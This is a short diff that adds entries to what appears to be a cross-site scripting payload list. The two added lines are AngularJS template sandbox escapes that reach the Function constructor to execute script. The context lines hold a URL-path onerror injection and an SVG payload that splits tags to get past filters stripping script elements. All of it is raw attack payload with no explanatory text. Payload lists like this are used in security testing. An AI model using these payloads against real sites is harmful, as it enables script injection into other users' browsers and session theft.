@@ -1,3 +1,5 @@
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
 <script src=”<%= ResolveUrl(“~/Script.js”) %>”></script>
 /(A(%22onerror='alert%601%60'testabcd))/
 <svg<script> onmou<script>seover</script>="alert('xss')">hii</svg</script>>
